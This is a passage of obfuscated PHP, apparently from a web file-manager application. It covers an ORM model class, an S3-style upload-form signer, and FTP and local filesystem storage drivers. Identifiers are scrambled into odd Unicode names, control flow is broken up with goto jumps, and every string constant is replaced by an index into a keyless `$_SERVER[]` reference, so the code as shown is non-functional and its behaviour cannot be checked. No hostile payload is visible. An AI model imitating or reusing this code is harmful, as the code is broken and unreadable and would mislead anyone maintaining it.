(strpos($Aҳ, $dӖ[47])) { list($F̈, $C˜) = explode($dӖ[47], $Aҳ); return $CȖ >= $F̈ && $CȖ <= $C˜; } else { return $CȖ == $Aҳ; } case $dӖ[327]: list($c, $f׺ö) = explode($dӖ[47], $Aҳ); if (!is_numeric($c)) { $c = strtotime($c); } if (!is_numeric($f׺ö)) { $f׺ö = strtotime($f׺ö); } return NOW_TIME >= $c && NOW_TIME <= $f׺ö; case $dӖ[328]: return in_array(get_client_ip(), explode($dӖ[47], $Aҳ)); case $dӖ[329]: return !in_array(get_client_ip(), explode($dӖ[47], $Aҳ)); case $dӖ[316]: default: return $this->regex($E, $Aҳ); } } public function query($cΤ±, $dÿ˙ = false) { $Bޛڥ =& $_SERVER[]; if (!is_bool($dÿ˙) && !is_array($dÿ˙)) { $dÿ˙ = func_get_args(); array_shift($dÿ˙); } $cΤ± = str_replace(array($Bޛڥ[217], $Bޛڥ[330]), $Bޛڥ[50], $cΤ±); $cΤ± = $this->parseSql($cΤ±, $dÿ˙); return $this->db->query($cΤ±); } public function execute($cȣ, $d拂Ӌ = false) { if (!is_bool($d拂Ӌ) && !is_array($d拂Ӌ)) { $d拂Ӌ = func_get_args(); array_shift($d拂Ӌ); } $cȣ = $this->parseSql($cȣ, $d拂Ӌ); return $this->db->execute($cȣ); } protected function parseSql($B, $F᪂) { $b =& $_SERVER[]; if (!0 === $F᪂) { $eɨ = $this->_parseOptions(); $B = $this->db->parseSql($B, $eɨ); } elseif (is_array($F᪂)) { $F᪂ = array_map(array($this->db, $b[331]), $F᪂); $B = vsprintf($B, $F᪂); } else { $B = strtr($B, array($b[332] => $this->getTableName(), $b[333] => think_config($b[232]))); } $this->db->setModel($this->name); return $B; } public function db($b = '', $B봒 = '', $E = array()) { goto dϏ; Dʘ: static $E = array(); if (!isset($E[$b]) || isset($E[$b]) && $B봒 && $d[$b] != $B봒) { if (!empty($B봒) && is_string($B봒) && !1 === strpos($B봒, $F[8])) { $B봒 = think_config($B봒); } $E[$b] = Db::getInstance($B봒); } elseif (NULL === $B봒) { $E[$b]->close(); unset($E[$b]); return; } if (!empty($E)) { if (is_string($E)) { parse_str($E, $E); } foreach ($E as $aѵ => $B) { $this->setProperty($aѵ, $B); } } goto f뛑; f뛑: $d[$b] = $B봒; $this->db = $E[$b]; $this->_after_db(); goto cо; dϏ: $F =& $_SERVER[]; if ($F[33] === $b && $this->db) { return $this->db; } static $d = array(); goto Dʘ; cо: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto A݉; A݉: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $a̓ = get_class($this); if ($a̓ == $_SERVER[][334]) { return $this->name; } $this->name = substr($a̓, 0, -5); } return $this->name; } public function getTableName() { $D =& $_SERVER[]; if (empty($this->trueTableName)) { $Cʈ = !empty($this->tablePrefix) ? $this->tablePrefix : $D[33]; if (!empty($this->tableName)) { $Cʈ .= $this->tableName; } else { $Cʈ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Cʈ); } return (!empty($this->dbName) ? $this->dbName . $D[91] : $D[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $B䰎 =& $_SERVER[]; return isset($this->fields[$B䰎[239]]) ? $this->fields[$B䰎[239]] : $this->pk; } public function getDbFields() { $Bŧ =& $_SERVER[]; if (isset($this->options[$Bŧ[267]])) { $bٴƲι = $this->db->getFields($this->options[$Bŧ[267]]); return $bٴƲι ? array_keys($bٴƲι) : !1; } if ($this->fields) { $bٴƲι = $this->fields; unset($bٴƲι[$Bŧ[238]], $bٴƲι[$Bŧ[239]], $bٴƲι[$Bŧ[240]], $bٴƲι[$Bŧ[237]]); return $bٴƲι; } return !1; } public function data($E = '') { $b =& $_SERVER[]; if ($b[33] === $E && !empty($this->data)) { return $this->data; } if (is_object($E)) { $E = get_object_vars($E); } elseif (is_string($E)) { parse_str($E, $E); } elseif (!is_array($E)) { think_exception(think_lang($b[259])); } $this->data = $E; return $this; } public function join($c߭) { $Bú =& $_SERVER[]; if (is_array($c߭)) { $this->options[$Bú[270]] = $c߭; } elseif (!empty($c߭)) { $this->options[$Bú[270]][] = $c߭; } return $this; } public function union($AǸ, $e = false) { goto a; a: $c =& $_SERVER[]; if (empty($AǸ)) { return $this; } if ($e) { $this->options[$c[335]][$c[336]] = !0; } goto C٪; Dؑ: return $this; goto E΃; C٪: if (is_object($AǸ)) { $AǸ = get_object_vars($AǸ); } if (is_string($AǸ)) { $bȶ = $AǸ; } elseif (is_array($AǸ)) { if (isset($AǸ[0])) { $this->options[$c[335]] = array_merge($this->options[$c[335]], $AǸ); return $this; } else { $bȶ = $AǸ; } } else { think_exception(think_lang($c[259])); } $this->options[$c[335]][] = $bȶ; goto Dؑ; E΃: } public function cache($eԦ = true, $dɷ⸉ = null, $dއŸ = '') { $Dǵ =& $_SERVER[]; if (!1 !== $eԦ) { $this->options[$Dǵ[337]] = array($Dǵ[89] => $eԦ, $Dǵ[327] => $dɷ⸉, $Dǵ[29] => $dއŸ); } return $this; } public function field($Fɯ, $F = false) { $B =& $_SERVER[]; if (!0 === $Fɯ) { $d񫔟 = $this->getDbFields(); $Fɯ = $d񫔟 ? $d񫔟 : $B[176]; } elseif ($F) { if (is_string($Fɯ)) { $Fɯ = explode($B[47], $Fɯ); } $d񫔟 = $this->getDbFields(); $Fɯ = $d񫔟 ? array_diff($d񫔟, $Fɯ) : $Fɯ; } $this->options[$B[261]] = $Fɯ; return $this; } public function scope($BĂ = '', $E⦇ = NULL) { $A͚ݷᄮ =& $_SERVER[]; if ($A͚ݷᄮ[33] === $BĂ) { if (isset($this->_scope[$A͚ݷᄮ[34]])) { $C = $this->_scope[$A͚ݷᄮ[34]]; } else { return $this; } } elseif (is_string($BĂ)) { $eã݊ = explode($A͚ݷᄮ[47], $BĂ); $C = array(); foreach ($eã݊ as $c) { if (!isset($this->_scope[$c])) { continue; } $C = array_merge($C, $this->_scope[$c]); } if (!empty($E⦇) && is_array($E⦇)) { $C = array_merge($C, $E⦇); } } elseif (is_array($BĂ)) { $C = $BĂ; } if (is_array($C) && !empty($C)) { $this->options = array_merge($this->options, array_change_key_case($C)); } return $this; } public function where($c, $cȈ꫑ = null) { $A򅳂 =& $_SERVER[]; if (!is_null($cȈ꫑) && is_string($c)) { if (!is_array($cȈ꫑)) { $cȈ꫑ = func_get_args(); array_shift($cȈ꫑); } $cȈ꫑ = array_map(array($this->db, $A򅳂[331]), $cȈ꫑); $c = vsprintf($c, $cȈ꫑); } elseif (is_object($c)) { $c = get_object_vars($c); } elseif (is_array($c)) { foreach ($c as $Bُȇ => $dᔪ) { if ((is_numeric($Bُȇ) || !$Bُȇ) && is_string($dᔪ)) { think_trace($A򅳂[338], $A򅳂[33], $A򅳂[46]); die; } } } if (is_string($c) && $A򅳂[33] != $c) { $B݄ = array(); $B݄[$A򅳂[339]] = $c; $c = $B݄; } if (isset($this->options[$A򅳂[263]])) { $this->options[$A򅳂[263]] = array_merge($this->options[$A򅳂[263]], $c); } else { $this->options[$A򅳂[263]] = $c; } return $this; } public function limit($Bɔ풕, $A㹢 = null) { $Bڏ =& $_SERVER[]; $this->options[$Bڏ[280]] = is_null($A㹢) ? $Bɔ풕 : $Bɔ풕 . $Bڏ[47] . $A㹢; return $this; } public function page($Eχϑ, $bȿ = null) { $Bѳ =& $_SERVER[]; $this->options[$Bѳ[340]] = is_null($bȿ) ? $Eχϑ : $Eχϑ . $Bѳ[47] . $bȿ; return $this; } public function comment($A) { $this->options[$_SERVER[][341]] = $A; return $this; } public function setProperty($B, $b) { if (property_exists($this, $B)) { $this->{$B} = $b; } return $this; } } goto b; b: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($aۗޥ) { parent::__construct($aۗޥ); $this->signatureVersion($_SERVER[][200]); } public function uploadFormData($fӠ, $bɇ = 3600) { goto A; FѾ: $cɉ = hash_hmac($cث[1146], $c쌰յ, $E, !0); $B۫Ì = hash_hmac($cث[1146], $Cڊ񝦂, $cɉ, !0); $Cܦ = hash_hmac($cث[1146], $C뙋, $B۫Ì); goto F; D: $B盤 = array($this->accessKey, $cڄġ, $this->region, $c쌰յ, $Cڊ񝦂); $EΦ = implode($cث[8], $B盤); $Eǋ = array($cث[1104] => gmdate($cث[1103], strtotime($cث[1139])), $cث[1105] => array(array($cث[1107] => $this->bucket), array($cث[1106] => $cƆ), array($cث[1108], $cث[1109], $cث[33]), array($cث[1108], $cث[1140], $cث[33]), array($cث[1108], $cث[1141], $cث[33]), array($cث[1110] => $f), array($cث[1142] => $EΦ), array($cث[1143] => $dۆþۑ), array($cث[1144] => $Fݾ), array($cث[1145] => $c㗍))); goto DՕ; F: $cъ٥ = array($cث[199] => $cث[33], $cث[1148] => $cث[33], $cث[1106] => $cƆ, $cث[1110] => $f, $cث[1114] => $C뙋, $cث[1149] => $EΦ, $cث[1150] => $dۆþۑ, $cث[1151] => $Fݾ, $cث[1152] => $c㗍, $cث[1153] => $Cܦ, $cث[169] => $this->getHost()); return $cъ٥; goto Dǉ։; Fѯ: $c쌰յ = $cث[59]; $Fݾ = gmdate($cث[1137]); $cڄġ = gmdate($cث[689]); goto B; A: $cث =& $_SERVER[]; $cƆ = $cث[185]; $dۆþۑ = $cث[1136]; goto Fѯ; DՕ: $C뙋 = base64_encode(json_encode($Eǋ)); $F = hash_hmac($cث[1146], $cڄġ, $cث[1147] . $this->secret, !0); $E = hash_hmac($cث[1146], $this->region, $F, !0); goto FѾ; B: $Cڊ񝦂 = $cث[1138]; $c㗍 = $bɇ . $cث[33]; $f = $cث[1102]; goto D; Dǉ։: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($fϥܢ) { parent::__construct(); if (count($fϥܢ) > 0) { $this->_init($fϥܢ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($dƨʻ) { $cݳ =& $_SERVER[]; global $config; $this->appCharset = $config[$cݳ[1154]]; $this->systemCharset = $config[$cݳ[1155]]; if (isset($dƨʻ[$cݳ[1156]]) && $dƨʻ[$cݳ[1156]]) { $this->systemCharset = $dƨʻ[$cݳ[1156]]; } } public function iconvApp($D) { return $this->iconvTo($D, $this->systemCharset, $this->appCharset); } public function iconvSystem($b䰾) { return $this->iconvTo($b䰾, $this->appCharset, $this->systemCharset); } public function getPathOuter($D) { goto c߳; EԋÆ: $D = KodIO::clear($D); $D = substr($D, strlen($a􅊙)); if (empty($this->pathDriver)) { return $D; } goto CıϹ; F߻: if (substr($a􅊙, 0, 2) == $eз[1157]) { $a􅊙 = BASIC_PATH . substr($a􅊙, 2); } if (substr($D, 0, 2) == $eз[1157]) { $D = BASIC_PATH . substr($D, 2); } $a􅊙 = KodIO::clear($a􅊙); goto EԋÆ; CıϹ: return $this->pathDriver . $eз[8] . ltrim($D, $eз[8]); goto eɜ; c߳: $eз =& $_SERVER[]; $a􅊙 = $this->iconvApp($this->pathBase); $D = $this->iconvApp($D); goto F߻; eɜ: } private function _init($Dں = array()) { $D艂 =& $_SERVER[]; if (!function_exists($D艂[1158])) { show_json(LNG($D艂[1159]), !1); } $this->config = $Dں; $this->charsetReset($Dں); foreach ($Dں as $E => $d) { if (isset($this->{$E})) { $this->{$E} = $d; } } return $this->_login($Dں); } private function _login($fƫ) { goto c܈; F: if (isset($BѨΪ[$dǼ])) { foreach ($BѨΪ[$dǼ] as $Dٞ => $eܿ) { $this->{$Dٞ} = $eܿ; } return !0; } $dқ = parse_url(trim($this->server, $fÉ[8])); $this->host = $dқ[$fÉ[169]]; goto fޏ; Cԃɮ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Bɥ = @ftp_login($this->connect, $this->username, $this->userpass); goto fП; fП: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $C = $this->pasv == $fÉ[83] ? !0 : !1; @ftp_pasv($this->connect, $C); goto E֞; fޏ: $bˆ۴ = isset($dқ[$fÉ[168]]) && $dқ[$fÉ[168]] == $fÉ[1160] ? !0 : !1; $this->scheme = $bˆ۴ ? $fÉ[1161] : $fÉ[1162]; $this->port = isset($dқ[$fÉ[170]]) ? $dқ[$fÉ[170]] : 21; goto Cԃɮ; c܈: $fÉ =& $_SERVER[]; static $BѨΪ = array(); $dǼ = md5(json_encode($fƫ)); goto F; E֞: $BѨΪ[$dǼ] = array($fÉ[1163] => $this->connect, $fÉ[169] => $this->host, $fÉ[168] => $this->scheme, $fÉ[170] => $this->port); return $Bɥ; goto BǧɅ; BǧɅ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Aνէ, $B = '', $e = REPEAT_RENAME) { if ($this->setContent($Aνէ, $B)) { return $this->getPathOuter($Aνէ); } return !1; } public function mkdir($Aѝ, $dĮ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Aѝ = $this->iconvSystem($Aѝ); if ($this->isFolder($Aѝ) || @ftp_mkdir($this->connect, $Aѝ)) { return $this->getPathOuter($Aѝ); } if (!$this->mkdir($this->pathFather($Aѝ))) { return !1; } if ($Aѝ = @ftp_mkdir($this->connect, $Aѝ)) { return $this->getPathOuter($Aѝ); } return !1; } public function copyFile($Aʪ, $Eն) { goto fӅ; Dۍƣ: $a = $this->iconvApp($Dְ); $this->download($Aʪ, $a); $Eɭ = $this->upload($Eն, $a); goto a; fӅ: if (!$this->_isconn()) { return !1; } $dΥ = $this->pathThis($this->iconvSystem($Aʪ)); $Dְ = $this->tempFile($dΥ); goto Dۍƣ; a: $this->tempFileRemve($Dְ); return $Eɭ; goto Dꍏͯ; Dꍏͯ: } public function moveFile($e, $Dҍ߼) { if (!$this->_isconn()) { return !1; } $e = $this->iconvSystem($e); $Dҍ߼ = $this->iconvSystem($Dҍ߼); $F֥ = @ftp_rename($this->connect, $e, $Dҍ߼); return $F֥ ? $this->getPathOuter($Dҍ߼) : !1; } public function delFile($AÑ􍽂) { if (!$this->_isconn()) { return !1; } $AÑ􍽂 = $this->iconvSystem($AÑ􍽂); return @ftp_delete($this->connect, $AÑ􍽂); } public function delFolder($e) { if (!$this->_isconn()) { return !1; } $e = $this->iconvSystem($e); $cύ = $this->ftpList($e); if (!$cύ) { return @ftp_rmdir($this->connect, $e); } foreach ($cύ as $F͙) { if ($this->isFolder($F͙)) { $F͙ = $this->iconvApp($F͙); $this->delFolder($F͙); } else { @ftp_delete($this->connect, $F͙); } } return @ftp_rmdir($this->connect, $e); } public function rename($A۱, $e) { goto c׾; f飽ѷ: $cك = rtrim($f䘱, $d䋡ھ[8]) . $d䋡ھ[8] . $aǎ嘡; $E埏 = @ftp_rename($this->connect, $A۱, $cك); $cك = $this->iconvApp($cك); goto a˯; eǉ: $aǎ嘡 = $this->iconvSystem($aǎ嘡); $A۱ = $this->iconvSystem($A۱); $f䘱 = $this->pathFather($A۱); goto f飽ѷ; a˯: return $E埏 ? $this->getPathOuter($cك) : !1; goto cƼ; c׾: $d䋡ھ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $aǎ嘡 = $this->fileNameAuto($this->pathFather($A۱), $e); goto eǉ; cƼ: } private function folderInfo($dǩԗĻ, $dظ = false) { goto F葑; AĿ: $C = $this->iconvSystem($dǩԗĻ); if ($dظ) { return array($f鴽[28] => $a, $f鴽[75] => $c, $f鴽[29] => $f鴽[76]); } $Eʣ = array($f鴽[28] => $a, $f鴽[75] => $c, $f鴽[29] => $f鴽[76], $f鴽[187] => 0, $f鴽[107] => 0, $f鴽[1164] => !0, $f鴽[1165] => !0); goto cά; cά: return $Eʣ; goto FԨԌ; F葑: $f鴽 =& $_SERVER[]; $c = $this->getPathOuter(rtrim($dǩԗĻ, $f鴽[8])); $a = $this->pathThis($c); goto AĿ; FԨԌ: } private function fileInfo($CЊҒ, $Dդژ = false) { goto Dܵ; CԚ: $eᬄ޽ = $this->iconvSystem($CЊҒ); if ($Dդژ) { return array($eƚ[28] => $AЯڲ, $eƚ[75] => $Fǒ͛, $eƚ[29] => $eƚ[167], $eƚ[160] => $this->ext($CЊҒ), $eƚ[77] => $this->size($CЊҒ)); } $d = array($eƚ[28] => $AЯڲ, $eƚ[75] => $Fǒ͛, $eƚ[29] => $eƚ[167], $eƚ[187] => 0, $eƚ[107] => @ftp_mdtm($this->connect, $eᬄ޽), $eƚ[160] => $this->ext($CЊҒ), $eƚ[77] => $this->size($CЊҒ), $eƚ[1164] => !0, $eƚ[1165] => !0); goto D; Dܵ: $eƚ =& $_SERVER[]; $Fǒ͛ = $this->getPathOuter(rtrim($CЊҒ, $eƚ[8])); $AЯڲ = $this->pathThis($Fǒ͛); goto CԚ; D: $d[$eƚ[107]] = $d[$eƚ[107]] > 0 ? $d[$eƚ[107]] : 0; return $d; goto a􍊡ת; a􍊡ת: } public function size($dԫ) { $DΨÆ = $this->objectMeta($dԫ); return $DΨÆ ? $DΨÆ[$_SERVER[][77]] : 0; } public function info($B֣) { if ($this->isFile($B֣)) { return $this->fileInfo($B֣, 0); } else { if ($this->isFolder($B֣)) { return $this->folderInfo($B֣); } } return !1; } public function exist($E) { return $this->objectMeta($E) ? !0 : !1; } public function isFile($A׊) { $D =& $_SERVER[]; $Aߢ = $this->objectMeta($A׊); return $Aߢ ? $Aߢ[$D[29]] == $D[167] : !1; } public function isFolder($a솇) { $d =& $_SERVER[]; $c֋ = $this->objectMeta($a솇); return $c֋ ? $c֋[$d[29]] == $d[76] : !1; } public function listPath($A, $AХ͠ = false) { goto E͂; d: $A뺢 = $this->ftpList($A); $e = array($aΦЎ[74] => array(), $aΦЎ[73] => array()); if (!$A뺢) { return $e; } goto c돕؄; E͂: $aΦЎ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $A = $this->iconvSystem($A); goto d; c돕؄: foreach ($A뺢 as $A) { if ($this->isFolder($A)) { $e[$aΦЎ[74]][] = $this->folderInfo($A, $AХ͠); } else { $e[$aΦЎ[73]][] = $this->fileInfo($A, $AХ͠); } } return $e; goto eË; eË: } public function has($c, $E = false, $DߌƏ = true) { goto A; Fͦ: foreach ($Bߗ as $c) { if ($DߌƏ) { if (!$this->isFolder($c)) { return !0; } } else { if ($this->isFolder($c)) { return !0; } } } return !1; goto B駓; B͏: $Bߗ = $this->ftpList($c); if (!$Bߗ) { return !1; } if ($E) { return array($Fֻ̉[191] => 0, $Fֻ̉[192] => count($Bߗ)); } goto Fͦ; A: $Fֻ̉ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $c = $this->iconvSystem($c); goto B͏; B駓: } public function listAll($CƧ) { goto bɴ; bɴ: $d׬ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $CƧ = $this->iconvSystem($CƧ); goto bκ; bκ: $a = array($d׬[73] => array(), $d׬[74] => array()); $this->recursionFtpFiles($CƧ, $a); $dɍֻ = array(); goto cť賲; cť賲: foreach ($a[$d׬[74]] as $cʉ) { $dɍֻ[] = array($d׬[75] => $d׬[8] . trim(str_replace($CƧ, $d׬[33], $cʉ), $d׬[8]) . $d׬[8], $d׬[76] => 1, $d׬[77] => 0); } foreach ($a[$d׬[73]] as $E۬) { $dɍֻ[] = array($d׬[75] => $d׬[8] . trim(str_replace($CƧ, $d׬[33], $E۬), $d׬[8]), $d׬[76] => 0, $d׬[77] => $this->size($E۬)); } return $dɍֻ; goto bߎ; bߎ: } public function getContent($B˄Ϡ) { if (!$this->_isconn()) { return !1; } $B˄Ϡ = $this->iconvSystem($B˄Ϡ); return $this->fileSubstr($B˄Ϡ); } public function setContent($dꩠ, $e = '') { goto fʣ㳓; f: return $F輡; goto fљÍҵ; fʣ㳓: if (!$this->_isconn()) { return !1; } $EҢ = $this->pathThis($this->iconvSystem($dꩠ)); $f´ = $this->tempFile($EҢ); goto Bî; Bî: file_put_contents($f´, $e); $F輡 = $this->upload($dꩠ, $this->iconvApp($f´)); $this->tempFileRemve($f´); goto f; fљÍҵ: } public function fileSubstr($bĂʭ, $A = 0, $c = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($bĂʭ, $A, $c); } private function ftpRequest($FϮ, $Bȧ = 0, $a雬 = false) { goto F냶ѩ; C: curl_setopt($B⌆, CURLOPT_RETURNTRANSFER, 1); $D = curl_exec($B⌆); curl_close($B⌆); goto DϞ; DϞ: return $D; goto Eū; F냶ѩ: $FϮ = $this->iconvSystem($FϮ); $Cò = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $B⌆ = curl_init(); goto Aޯ; Aޯ: curl_setopt($B⌆, CURLOPT_URL, $Cò . $this->pathEncode($FϮ)); curl_setopt($B⌆, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($a雬) { $E = $Bȧ + $a雬 - 1; curl_setopt($B⌆, CURLOPT_RANGE, "{$Bȧ}\55{$E}"); } goto C; Eū: } public function upload($EĻ, $B, $Dڍ = false, $EԨ = REPEAT_REPLACE) { goto dʭ; Fƌ: $B = $this->iconvSystem($B); $D׌ = ftp_nb_put($this->connect, $EĻ, $B, FTP_BINARY); while ($D׌ == FTP_MOREDATA) { $D׌ = ftp_nb_continue($this->connect); } goto d؈ꂇ; d؈ꂇ: if ($D׌ != FTP_FINISHED) { return !1; } return $this->getPathOuter($EĻ); goto aˇ; dʭ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($EĻ))) { return !1; } $EĻ = $this->iconvSystem($EĻ); goto Fƌ; aˇ: } public function download($D, $Eާ׻ = '') { goto bܫ; bܫ: if (!$this->_isconn()) { return !1; } $a = $this->pathFather($Eާ׻); if (!IO::mkdir($a)) { return !1; } goto D꟎ݒ; C: while ($Dܕ == FTP_MOREDATA) { $Dܕ = ftp_nb_continue($this->connect); } if ($Dܕ != FTP_FINISHED) { return !1; } return $this->iconvApp($Eާ׻); goto Eݍ; D꟎ݒ: $D = $this->iconvSystem($D); $Eާ׻ = $this->iconvSystem($Eާ׻); $Dܕ = ftp_nb_get($this->connect, $Eާ׻, $D, FTP_BINARY); goto C; Eݍ: } private function ftpList($BⰉ) { goto b; b: $Eӯ =& $_SERVER[]; if (!$this->isFolder($BⰉ)) { return !1; } @ftp_chdir($this->connect, $Eӯ[8]); goto E; E: $BⰉ = rtrim($BⰉ, $Eӯ[8]) . $Eӯ[8]; $f = @ftp_nlist($this->connect, $BⰉ); if ($f === !1) { $f = @ftp_rawlist($this->connect, $BⰉ); foreach ($f as $e꼏 => $aΖְ) { $f[$e꼏] = end(explode($Eӯ[1166], $aΖְ)); } } goto e; B܉: return $d옾; goto A; e: $f = array_diff($f, array($Eӯ[91], $Eӯ[1167], $BⰉ . $Eӯ[91], $BⰉ . $Eӯ[1167])); $d옾 = array(); foreach ($f as $dَ) { if (!strstr($dَ, $Eӯ[8])) { $dَ = $BⰉ . ltrim($dَ, $Eӯ[8]); } $d옾[] = $this->iconvApp($dَ); } goto B܉; A: } private function recursionFtpFiles($a, &$cΎ) { $dՕ͸ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } if (!($f𭡧 = $this->ftpList($a))) { return !1; } foreach ($f𭡧 as $a) { if ($this->isFolder($a)) { $this->recursionFtpFiles($a, $cΎ); $cΎ[$dՕ͸[74]][] = $a; } else { $cΎ[$dՕ͸[73]][] = $a; } } } private function objectMeta($c̝) { goto F礚; F礚: $Cǝ =& $_SERVER[]; $Fᰐ = $Cǝ[1168] . md5($c̝); $Aׂ = Cache::get($Fᰐ); goto A; d̬: $EʳҬ = @ftp_size($this->connect, $this->iconvSystem($c̝)); if ($EʳҬ != -1) { $Aׂ = array($Cǝ[77] => $EʳҬ, $Cǝ[29] => $Cǝ[167]); } else { $cꙹ = @ftp_chdir($this->connect, $this->iconvSystem($c̝)); $Aׂ = $cꙹ ? array($Cǝ[77] => 0, $Cǝ[29] => $Cǝ[76]) : !1; } Cache::set($Fᰐ, $Aׂ, 0); goto a; A: if ($Aׂ !== null && $Aׂ !== !1) { return $Aׂ; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $Cǝ[8]); goto d̬; a: return $Aׂ; goto Eޮ; Eޮ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($BȥǱ) { if (substr($BȥǱ, 0, 2) == $_SERVER[][1157]) { $BȥǱ = BASIC_PATH . substr($BȥǱ, 2); } return $BȥǱ; } public function iconvApp($C̓) { $e =& $_SERVER[]; global $config; return $this->iconvTo($C̓, $config[$e[1155]], $config[$e[1154]]); } public function iconvSystem($Bč섬) { $Fէ =& $_SERVER[]; global $config; return $this->iconvTo($Bč섬, $config[$Fէ[1154]], $config[$Fէ[1155]]); } public function getPathOuter($e) { goto aʭ; e󌷵: return $this->pathDriver . $Fʨʳ[8] . ltrim($e, $Fʨʳ[8]); goto Eτѹ; bʇ: $e = KodIO::clear($e); $e = substr($e, strlen($f︢)); if (empty($this->pathDriver)) { return $e; } goto e󌷵; aʭ: $Fʨʳ =& $_SERVER[]; $f︢ = $this->iconvApp($this->pathBase); $e = $this->iconvApp($e); goto b⾚; b⾚: if (substr($f︢, 0, 2) == $Fʨʳ[1157]) { $f︢ = BASIC_PATH . substr($f︢, 2); } if (substr($e, 0, 2) == $Fʨʳ[1157]) { $e = BASIC_PATH . substr($e, 2); } $f︢ = KodIO::clear($f︢); goto bʇ; Eτѹ: } public function mkfile($Cﾥ, $A = '', $B = REPEAT_RENAME) { $Cﾥ = $this->iconvSystem($Cﾥ); @touch($Cﾥ); if ($A) { file_put_contents($Cﾥ, $A); } return is_file($Cﾥ) ? $this->getPathOuter($Cﾥ) : !1; } public function mkdir($EЄ, $f񛃪 = REPEAT_SKIP) { $EЄ = $this->iconvSystem($EЄ); if (is_dir($EЄ)) { return $this->getPathOuter($EЄ); } @mkdir($EЄ, 511, !0); return is_dir($EЄ) ? $this->getPathOuter($EЄ) : !1; } public function copyFile($Eͺͭ, $CÑ) { $this->mkdir($this->pathFather($CÑ)); $Eͺͭ = $this->iconvSystem($Eͺͭ); $CÑ = $this->iconvSystem($CÑ); $D = @copy($Eͺͭ, $CÑ); return $D ? $this->getPathOuter($CÑ) : !1; } public function moveFile($bۦ, $a) { $this->mkdir($this->pathFather($a)); $bۦ = $this->iconvSystem($bۦ); $a = $this->iconvSystem($a); $f⫠ϫ = intval(@rename($bۦ, $a)); if (!$f⫠ϫ) { if ($f⫠ϫ = intval(@copy($bۦ, $a))) { @unlink($bۦ); } } return $f⫠ϫ ? $this->getPathOuter($a) : !1; } public function delFile($Bߎ) { $Bߎ = $this->iconvSystem($Bߎ); if (!@unlink($Bߎ)) { @chmod($Bߎ, 511); if (!@unlink($Bߎ)) { return !1; } } else { return !0; } } public function delFolder($Eĵͧ) { goto Cʘ; e慅: if (!($Dݶ = opendir($Eĵͧ))) { return !1; } while (($Cϒų = readdir($Dݶ)) !== !1) { if ($Cϒų == $C[91] || $Cϒų == $C[1167]) { continue; } $D = $Eĵͧ . $C[8] . $Cϒų; if (is_file($D) || is_link($D)) { if (!unlink($D)) { chmod($D, 511); if (!unlink($D)) { return !1; } } } else { if (is_dir($D)) { chmod($D, 511); $D = $this->iconvApp($D); if (!$this->delFolder($D)) { return !1; } } } } closedir($Dݶ); goto eʬ; Cʘ: $C =& $_SERVER[]; $Eĵͧ = $this->iconvSystem($Eĵͧ); if (!is_dir($Eĵͧ)) { return !0; } goto e慅; eʬ: return rmdir($Eĵͧ); goto Dă; Dă: } public function rename($c, $a) { goto F޶純; F޶純: $BЪ =& $_SERVER[]; $Dʂ = $this->fileNameAuto($this->pathFather($c), $a); $Dʂ = $this->iconvSystem($Dʂ); goto B𣸱; B𣸱: $c = $this->iconvSystem($c); $Dڤ = $this->pathFather($c); $c띖 = rtrim($Dڤ, $BЪ[8]) . $BЪ[8] . $Dʂ; goto fЋ; fЋ: $A鋃 = @rename($c, $c띖); $c띖 = $this->iconvApp($c띖); return $A鋃 ? $this->getPathOuter($c띖) : !1; goto e󲅮; e󲅮: } public function size($E䠩ɂ) { $E䠩ɂ = $this->iconvSystem($E䠩ɂ); return (double) abs(sprintf($_SERVER[][1169], @filesize($E䠩ɂ))); } public function info($CΊ) { $CΊ = $this->iconvSystem($CΊ); if ($this->isFolder($CΊ)) { return $this->folderInfo($CΊ); } else { if ($this->isFile($CΊ)) { return $this->fileInfo($CΊ); } } return !1; } protected function infoChildren($CȾҨ, &$Eމ, $Fɺ = true) { goto FƓ; E: closedir($e㗔); goto D; FƓ: $FӨ =& $_SERVER[]; check_abort(); $CȾҨ = rtrim($CȾҨ, $FӨ[8]) . $FӨ[8]; goto bǎՙ; bǎՙ: if ($Fɺ) { $CȾҨ = $this->iconvSystem($CȾҨ); } if (!($e㗔 = @opendir($CȾҨ))) { return; } while (($dҮС = readdir($e㗔)) !== !1) { if ($dҮС == $FӨ[91] || $dҮС == $FӨ[1167]) { continue; } $c¹ = $CȾҨ . $dҮС; if (is_file($c¹) || is_link($c¹)) { $Eމ[$FӨ[78]]++; $Eމ[$FӨ[77]] += (double) abs(sprintf($FӨ[1169], @filesize($c¹))); } else { if (is_dir($c¹)) { $Eމ[$FӨ[79]]++; $this->infoChildren($c¹, $Eމ, !1); } } } goto E; D: } private function folderInfo($d悰, $D = false) { $b =& $_SERVER[]; $d悰 = rtrim($d悰, $b[8]) . $b[8]; $E = $this->iconvApp($this->pathThis($d悰)); if ($D) { return array($b[28] 